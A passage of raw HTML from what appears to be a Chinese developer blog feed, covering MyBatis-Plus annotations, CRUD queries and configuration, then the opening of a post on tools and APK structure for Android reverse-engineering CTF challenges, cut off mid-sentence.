class="keyword">private</span> Integer user_id;</span><br></pre></td></tr></table></figure><table><thead><tr><th>type</th><th>常见的类型介绍</th></tr></thead><tbody><tr><td>NONE</td><td>MP set主键,雪花算法实现</td></tr><tr><td>AUTO</td><td>数据库自增</td></tr><tr><td>INPUT</td><td>需要开发者手动输入</td></tr><tr><td>ASSIGN_ID</td><td>MP分配ID,Long、Integer、String</td></tr><tr><td>ASSING_UUID</td><td>分配UUID,String</td></tr></tbody></table><p>AUTO: 数据库自增,开发者不需要赋值(从最大id自增,手动赋值没用)<br>INPUT: 如果开发者没有手动赋值,id值会按照最大值自增<br>ASSIGN_UUID: 主键的类型必须是String类,自动生成UUID 进行赋值<br>默认生成随机数(雪花算法)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@TableId(type = IdType.NONE)</span>  <span class="comment">//相当于@TableId</span></span><br><span class="line">    <span class="keyword">private</span> Integer user_id;</span><br><span class="line"><span class="meta">@TableId(type = IdType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> Integer user_id;</span><br><span class="line"><span class="meta">@TableId(type = IdType.INPUT)</span> </span><br><span class="line">    <span class="keyword">private</span> Integer user_id;</span><br></pre></td></tr></table></figure><ul><li>@TableField<br>映射非主键字段<br>select: 是否查询该字段<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@TableField(value = &quot;user_name&quot;,select = false)</span></span><br><span class="line">    <span class="keyword">private</span> String user_name;</span><br></pre></td></tr></table></figure></li></ul><p>exist:是否为数据库字段. (默认为true设置为 false)<br>如果实体类中的成员变量在数据库中没有对应的字段,则可以通过使用exist,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@TableField(exist = false)</span></span><br><span class="line"><span class="keyword">private</span> String pa;</span><br></pre></td></tr></table></figure><p>fill: 是否自动填充,将对象 存入数据库的时候,由MyBatis Plus自动给某些字段赋值.</p><ol><li>选择有create_time ,update_time字段的表<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@TableField(fill = FieldFill.INSERT)</span></span><br><span class="line"><span class="keyword">private</span> Date userCreateTime;</span><br><span class="line"><span class="meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span></span><br><span class="line"><span class="keyword">private</span> Date userUpdateTime;</span><br></pre></td></tr></table></figure></li><li>创建自动填充的处理器<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.q0o0p.mybatisplus.handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.handlers.MetaObjectHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.reflection.MetaObject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMetaObjectHandler</span> <span class="keyword">implements</span> <span class="title">MetaObjectHandler</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertFill</span><span class="params">(MetaObject metaObject)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setFieldValByName(<span class="string">&quot;userCreateTime&quot;</span>, <span class="keyword">new</span> Date(), metaObject);</span><br><span class="line">        <span class="keyword">this</span>.setFieldValByName(<span class="string">&quot;userUpdateTime&quot;</span>, <span class="keyword">new</span> Date(), metaObject);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateFill</span><span class="params">(MetaObject metaObject)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setFieldValByName(<span class="string">&quot;userUpdateTime&quot;</span>,<span class="keyword">new</span> Date(),metaObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>@Version<br>标记乐观锁,通过version保证数据的安全性,修改数据时以version 作为条件,条件成立时修改成功<br>(保证只有一个线程修改数据)</li></ul><ol><li>数据库添加version字段,默认值为1</li><li>实体类添加version成员变量,并且添加@Version</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Version</span> </span><br><span class="line"><span class="keyword">private</span> Ingeter version;</span><br></pre></td></tr></table></figure><ul><li>@EnumValue</li></ul><ol><li>通过枚举注解,将数据库字段映射成枚举类型成员变量<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.q0o0p.mybatisplus.enums;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.EnumValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">StatusEnum</span> </span>&#123;</span><br><span class="line">    WORK(<span class="number">1</span>,<span class="string">&quot;上班状态&quot;</span>),</span><br><span class="line">    REST(<span class="number">0</span>,<span class="string">&quot;休息&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@EnumValue</span></span><br><span class="line">    <span class="keyword">private</span> Integer code;</span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line"></span><br><span class="line">    StatusEnum(Integer code, String msg) &#123;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">        <span class="keyword">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//entity--&gt;User.class</span></span><br><span class="line">    <span class="keyword">private</span> StatusEnum status;</span><br><span class="line"><span class="comment">//application.yml</span></span><br><span class="line">    type-enums-<span class="keyword">package</span>: </span><br><span class="line">        top.q0o0p.mybatisplus.enums</span><br></pre></td></tr></table></figure></li><li>通过接口的方式<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.q0o0p.mybatisplus.enums;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.enums.IEnum;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">SexEnum</span> <span class="keyword">implements</span> <span class="title">IEnum</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    female(<span class="number">1</span>,<span class="string">&quot;女&quot;</span>),</span><br><span class="line">    male(<span class="number">0</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer code;</span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line"></span><br><span class="line">    SexEnum(Integer code, String msg) &#123;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">        <span class="keyword">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//User.class</span></span><br><span class="line">    <span class="keyword">private</span> SexEnum user_sex;</span><br></pre></td></tr></table></figure></li></ol><ul><li>@TableLogic<br>映射逻辑删除</li></ul><ol><li>数据表添加deleted 字段</li><li>实体类添加注解<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@TableLogic(value = &quot;user_deleted&quot;)</span></span><br><span class="line"><span class="keyword">private</span> Integer deleted;</span><br></pre></td></tr></table></figure></li><li>application.yml中添加配置<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">global-config:</span><br><span class="line">    db-config:</span><br><span class="line">      logic-not-delete-value: <span class="number">0</span></span><br><span class="line">      logic-delete-value: <span class="number">1</span></span><br></pre></td></tr></table></figure>application.yml文件<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">  datasource:</span><br><span class="line">    driver-<span class="class"><span class="keyword">class</span>-<span class="title">name</span>: <span class="title">com</span>.<span class="title">mysql</span>.<span class="title">cj</span>.<span class="title">jdbc</span>.<span class="title">Driver</span></span></span><br><span class="line"><span class="class">    <span class="title">url</span>: <span class="title">jdbc</span>:<span class="title">mysql</span>://<span class="title">localhost</span>:3306/<span class="title">parking</span>?<span class="title">useUnicode</span></span>=<span class="keyword">true</span>&amp;characterEncoding=utf-<span class="number">8</span>&amp;useSSL=<span class="keyword">true</span>&amp;serverTimezone=UTC</span><br><span class="line">    username: root</span><br><span class="line">    password: root</span><br><span class="line">  thymeleaf:</span><br><span class="line">    prefix: classpath:/templates/</span><br><span class="line">    suffix: .html</span><br><span class="line">mybatis-plus:</span><br><span class="line">  configuration:</span><br><span class="line">    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl</span><br><span class="line">  type-enums-<span class="keyword">package</span>:</span><br><span class="line">    top.q0o0p.parking_system.enums</span><br><span class="line">  global-config:</span><br><span class="line">    db-config:</span><br><span class="line">      logic-not-delete-value: <span class="number">0</span></span><br><span class="line">      logic-delete-value: <span class="number">1</span></span><br><span class="line">server:</span><br><span class="line">  port: <span class="number">8087</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;t&quot;</span>);</span><br><span class="line">        user.setPassword(<span class="string">&quot;qwer&quot;</span>);</span><br><span class="line">        mapper.insert(user);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mapper.deleteById(<span class="number">1234</span>);</span><br><span class="line"></span><br><span class="line">        mapper.deleteBatchIds(Arrays.asList(<span class="number">1234</span>, <span class="number">1236</span>));</span><br><span class="line">        <span class="comment">//根据条件删除</span></span><br><span class="line">        QueryWrapper wrapper = <span class="keyword">new</span> QueryWrapper();</span><br><span class="line">        wrapper.eq(<span class="string">&quot;user_name&quot;</span>, <span class="string">&quot;qw&quot;</span>);</span><br><span class="line">        mapper.delete(wrapper);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;user_name&quot;</span>, <span class="string">&quot;t&quot;</span>); <span class="comment">//等值判断</span></span><br><span class="line">        mapper.deleteByMap(map);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        User user = mapper.selectById(<span class="number">1238</span>);</span><br><span class="line">        user.setName(<span class="string">&quot;hhhhh&quot;</span>);</span><br><span class="line">        mapper.updateById(user);</span><br><span class="line"></span><br><span class="line">        User user = mapper.selectById(<span class="number">1237</span>);</span><br><span class="line">        user.setName(<span class="string">&quot;o_o&quot;</span>);</span><br><span class="line">        QueryWrapper wrapper = <span class="keyword">new</span> QueryWrapper();</span><br><span class="line">        wrapper.eq(<span class="string">&quot;user_sex&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        mapper.update(user, wrapper);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">select</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//        mapper.selectList(null); //不添加任何条件直接查询</span></span><br><span class="line"></span><br><span class="line">        QueryWrapper wrapper = <span class="keyword">new</span> QueryWrapper();</span><br><span class="line">        wrapper.eq(<span class="string">&quot;user_name&quot;</span>, <span class="string">&quot;hhhhh&quot;</span>);  <span class="comment">//单个条件查询</span></span><br><span class="line">        System.out.println(mapper.selectList(wrapper));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>多条件查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">        QueryWrapper wrapper = <span class="keyword">new</span> QueryWrapper();</span><br><span class="line"><span class="comment">//map只能做等值判断,逻辑判断需要使用warpper</span></span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;user_name&quot;</span>, <span class="string">&quot;tralate&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;user_create_time&quot;</span>, <span class="string">&quot;2020-05-16 20:19:28&quot;</span>);</span><br><span class="line">        wrapper.allEq(map);</span><br><span class="line"></span><br><span class="line">        System.out.println(mapper.selectList(wrapper));</span><br></pre></td></tr></table></figure><p>(user_id &lt; ?)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">wrapper.eq(<span class="string">&quot;user_id&quot;</span>, <span class="number">1234</span>);  <span class="comment">//id=1234</span></span><br><span class="line">wrapper.lt(<span class="string">&quot;user_id&quot;</span>, <span class="number">1234</span>);  <span class="comment">//id&lt;1234</span></span><br><span class="line">wrapper.gt(<span class="string">&quot;user_id&quot;</span>, <span class="number">1234</span>);  <span class="comment">//id&gt;1234</span></span><br><span class="line">wrapper.ge(<span class="string">&quot;user_id&quot;</span>, <span class="number">1234</span>);  <span class="comment">//id&gt;=1234</span></span><br><span class="line">wrapper.ne(<span class="string">&quot;user_id&quot;</span>, <span class="number">1234</span>);  <span class="comment">//id!=1234</span></span><br><span class="line">wrapper.like(<span class="string">&quot;user_id&quot;</span>, <span class="string">&quot;23&quot;</span>); <span class="comment">//模糊查询%23%</span></span><br><span class="line">wrapper.likeLeft(<span class="string">&quot;user_id&quot;</span>, <span class="string">&quot;23&quot;</span>); <span class="comment">//模糊查询%23</span></span><br><span class="line">wrapper.inSql(<span class="string">&quot;user_id&quot;</span>, <span class="string">&quot;select user_id from user where user_id&gt;1234&quot;</span>);</span><br><span class="line">wrapper.inSql(<span class="string">&quot;user_name&quot;</span>, <span class="string">&quot;select user_name from user where user_name=&#x27;tralate&#x27;&quot;</span>); <span class="comment">//sql语句查询</span></span><br><span class="line"></span><br><span class="line">wrapper.orderByAsc(<span class="string">&quot;user_sex&quot;</span>); <span class="comment">//升序排序</span></span><br><span class="line">wrapper.having(<span class="string">&quot;user_id&gt;1234&quot;</span>);  <span class="comment">//条件</span></span><br><span class="line"></span><br><span class="line">System.out.println(mapper.selectCount(wrapper));<span class="comment">//总数</span></span><br><span class="line"></span><br><span class="line">mapper.selectMaps(wrapper).forEach(System.out::println);<span class="comment">//将查询结果封装到map中 </span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(mapper.selectById(<span class="number">1234</span>)); <span class="comment">//id-1234</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//分页查询</span></span><br><span class="line">Page&lt;User&gt; page = <span class="keyword">new</span> Page&lt;&gt;(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">Page&lt;User&gt; result = mapper.selectPage(page,<span class="keyword">null</span>);</span><br><span class="line">System.out.println(result.getTotal());</span><br><span class="line">System.out.println(result.getSize());</span><br><span class="line">result.getRecords().forEach(System.out::println);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//map集合封装的分页信息</span></span><br><span class="line">Page&lt;Map&lt;String, Object&gt;&gt; page = <span class="keyword">new</span> Page&lt;&gt;(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">mapper.selectMapsPage(page,<span class="keyword">null</span>).getRecords().forEach(System.out::println);</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h3 id="自定义SQL、多表关联"><a href="#自定义SQL、多表关联" class="headerlink" title="自定义SQL、多表关联"></a>自定义SQL、多表关联</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.q0o0p.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Words</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer words_id;</span><br><span class="line">    <span class="keyword">private</span> String words_name;</span><br><span class="line">    <span class="keyword">private</span> String words_translate;</span><br><span class="line">    <span class="keyword">private</span> Integer user_id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">product</span><span class="params">()</span></span>&#123;</span><br><span class="line">      mapper.productList(<span class="string">&quot;tralate&quot;</span>).forEach(System.out::println);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><hr><h3 id="MyBatisPlus-自动生成"><a href="#MyBatisPlus-自动生成" class="headerlink" title="MyBatisPlus 自动生成"></a>MyBatisPlus 自动生成</h3><p>根据数据表自动生成实体类,Mapper, Service,  ServiceImpl, Controller</p><ol><li><p>pom.xml 导入MyBatis Plus Generator依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.baomidou&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis-plus-generator&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.3</span><span class="number">.1</span>.tmp&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;velocity&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.7</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>Velocity(默认),Freemarker, Beetl</p></li><li><p>启动类</p></li></ol><hr><h2 id="java异常处理"><a href="#java异常处理" class="headerlink" title="java异常处理:"></a>java异常处理:</h2><p><code>Cause: java.sql.SQLException: Zero date value prohibited</code><br>配置文件中添加:serverTimezone=Asia/Shanghai&amp;zeroDateTimeBehavior=convertToNull</p><p>url: jdbc:mysql://localhost:3306/positions?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=true&amp;serverTimezone=UTC&amp;serverTimezone=Asia/Shanghai&amp;zeroDateTimeBehavior=convertToNull</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向题</title>
      <link href="/2020/05/10/CTF-Android-Reverse/"/>
      <url>/2020/05/10/CTF-Android-Reverse/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><table><thead><tr><th>环境</th><th>作用</th></tr></thead><tbody><tr><td>jdk</td><td>java开发环境</td></tr><tr><td>sdk</td><td>软件开发工具包</td></tr><tr><td>NDK</td><td>允许使用C,C++原生代码</td></tr><tr><td>AndroidKiller</td><td>反编译得到的java代码</td></tr><tr><td>jeb</td><td>查看反编译源代码</td></tr><tr><td>IDA</td><td>反汇编</td></tr></tbody></table><hr><h2 id="apk目录介绍"><a href="#apk目录介绍" class="headerlink" title="apk目录介绍"></a>apk目录介绍</h2><table><thead><tr><th>文件或目录</th><th>作用</th></tr></thead><tbody><tr><td>META-INF/</td><td>描述apk包信息的目录，主要存放了签名信息，配置信息，service注册信息。MANIFEST.MF:该文件包含了该Jar包的版本、创建人和类搜索路径等信息，当然如果是可执行Jar包，会包含Main-Class属性，表明Main方法入口</td></tr><tr><td>res/</td><td>存放apk资源文件的目录，比如图片、图标、字符串、样式、颜色</td></tr><tr><td>assets/</td><td>存放需要打包到apk的静态资源文件(图片,JSON配置文件,二进制数据文件,HTML5离线资源文件)，但和res/raw有差异,assets目录支持任意深度的子目录,不会生成资源ID</td></tr><tr><td>resources.arsc</td><td>资源索引，包含不同语言环境中res目录下所有资源的类型、名称与ID所对应的信息</td></tr><tr><td>lib/</td><td>存放so文件，越来越多的应用由C/C++编写核心代码，以SO文件的形式供上层JAVA代码调用，以保证安全性，这个目录是逆向解密关注的重点</td></tr><tr><td>classes.dex(一个或数个)</td><td>Android程序运行在Dalvik虚拟机上，而dex就是Dalvik虚拟机的可执行文件, 相当于Windows平台中的exe文件，通过反编译dex，可以获得apk源码（这个说法不很准确，但方便理解）</td></tr><tr><td>AndroidManifest.xml</td><td>清单文件，包含了App大量的的配置信息，比如包名、应用需要拥有的权限（打电话/录音/网络通信等等）、以及所有的界面和程序组件的信息,无法解压apk时直接打开，因为清单文件在apk打包过程中被编译成了二进制格式文件</td></tr></tbody></table><hr><h2 id="需要使用的工具"><a href="#需要使用的工具" class="headerlink" title="需要使用的工具"></a>需要使用的工具</h2><table><thead><tr><th>工具</th><th>作用</th></tr></thead><tbody><tr><td>ApkTool</td><td>解析resources.arsc，AndroidManifest.xml等文件，反编译dex文件为smali源码</td></tr><tr><td>Dex2jar</td><td>将dex文件转化为jar文件</td></tr><tr><td>Jd-gui</td><td>反编译jar，查看java源码</td></tr><tr><td>IDA</td><td>动态调试so文件</td></tr></tbody></table><hr><h2 id="apkHelper"><a href="#apkHelper" class="headerlink" title="apkHelper"></a>apkHelper</h2><p><a href="https://github.com/PeterBuerer/apkHelper">https://github.com/PeterBuerer/apkHelper</a></p><p>获取软件包名称和版本信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apkHelper summary /path/to/the/file.apk</span><br></pre></td></tr></table></figure><p>签署apk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apkHelper sign --keystore /path/to/file.keystore --keypass [keypass] --storepass [storepass] [theApk] [keystoreAlias]</span><br></pre></td></tr></table></figure><p>Zipalign apk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apkHelper zipalign [theUnalignedApk] [nameForAlignedApk]</span><br></pre></td></tr></table></figure><p>如果未提供[nameForAlignedApk]，则对齐的apk将另存为[theUnalignedApk] -zipaligned.apk。</p><p>例如，myApp.apk将被命名为myApp-zipaligned.apk。</p><hr><h2 id="apktool"><a href="#apktool" class="headerlink" title="apktool"></a>apktool</h2><p> 反编译工具apktool 可以将classes.dex文件反编译成一堆的smali文件。</p><h3 id="smali文件"><a href="#smali文件" class="headerlink" title="smali文件"></a>smali文件</h3><p>smali语法类似于汇编语言的语法， 涉及寄存器的直接操作， 可以直接阅读， 但羞涩难懂， 尤其是在代码混淆之后</p><h4 id="smail文件打开方法"><a href="#smail文件打开方法" class="headerlink" title="smail文件打开方法"></a>smail文件打开方法</h4><p>有两种方法<br>1、 打开Sublime Text添加插件<br>Preferences -&gt; Browse Packages然后将会打开Finder显示Sublime Text的Packages目录，你可以在这里新建一个文件夹，命名为Smali，然后将下载的<a href="https://github.com/ShaneWilton/sublime-smali/archive/master.zip">smali.tmlanguage</a>文件复杂到新建的Smali文件夹中，重启Sublime Text，再次打开smali文件的时候，已经可以高亮显示了。</p><p>2、 在studio中搜索Smalidea进行插件下载（要翻墙）<br>smali反编译和导入<br>调试的步骤大概如下：</p><ul><li>通过apktool工具反编译目标Apk获取smali文件</li><li>修改xml中android:debuggable=”true”。</li><li>导入smali文件至Android studio ,在相应位置打好断点后，启动调试进程。</li></ul><hr><h2 id="dex2jar"><a href="#dex2jar" class="headerlink" title="dex2jar"></a>dex2jar</h2><p>有人做了一个专门的工具 dex2jar 将classes.dex 转化为jar 文件， 通过 jd-gui 阅读。<br>但dex2jar 并不健全， 